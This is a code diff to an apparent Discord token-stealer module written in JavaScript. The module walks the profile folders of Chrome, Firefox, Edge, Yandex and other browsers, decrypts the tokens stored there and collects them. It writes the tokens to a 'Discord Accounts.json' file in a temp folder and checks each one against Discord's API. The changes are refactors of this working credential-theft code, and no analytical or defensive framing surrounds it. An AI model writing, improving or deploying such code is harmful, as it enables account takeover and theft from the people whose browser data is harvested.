@@ -29,7 +29,7 @@ const paths = {
   'Chrome': join(localAppData, 'Google', 'Chrome', 'User Data'),
   'Chrome SxS': join(localAppData, 'Google', 'Chrome SxS', 'User Data'),
   'Firefox': join(roamingAppData, 'Mozilla', 'Firefox', 'Profiles'),
-  'Epic Privacy Browse': join(localAppData, 'Epic Privacy Browser', 'User Data'),
+  'Epic Privacy Browser': join(localAppData, 'Epic Privacy Browser', 'User Data'),
   'Microsoft Edge': join(localAppData, 'Microsoft', 'Edge', 'User Data'),
   'Uran': join(localAppData, 'uCozMedia', 'Uran', 'User Data'),
   'Yandex': join(localAppData, 'Yandex', 'YandexBrowser', 'User Data'),
@@ -70,17 +70,15 @@ const decryptRickRoll = (path) => {
           token = decryptToken(token, key);
           if (!!token && !tokens.includes(token)) tokens.push(token);
         });
-        if (tokens.length > 0) {
-          resolve(tokens);
-        } else {
-          reject();
-        }
+        tokens.length > 0 ? resolve(tokens) : reject();
       });
     });
   });
 };
 
 module.exports = new Promise((resolve) => {
+  const jsonFile = join(tempFolder, 'Discord Accounts.json');
+  writeFileSync(jsonFile, '{}');
   Object.keys(paths).forEach(path => {
     if (!existsSync(paths[path])) return;
     else if (path.includes('Firefox')) {
@@ -88,8 +86,6 @@ module.exports = new Promise((resolve) => {
     } else {
       decryptRickRoll(paths[path])
         .then(tokens => {
-          const jsonFile = join(tempFolder, 'dsc_acc.json');
-          writeFileSync(jsonFile, '{}');
           tokens.map(token => {
             token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
             axios.get('https://discord.com/api/v10/users/@me', {
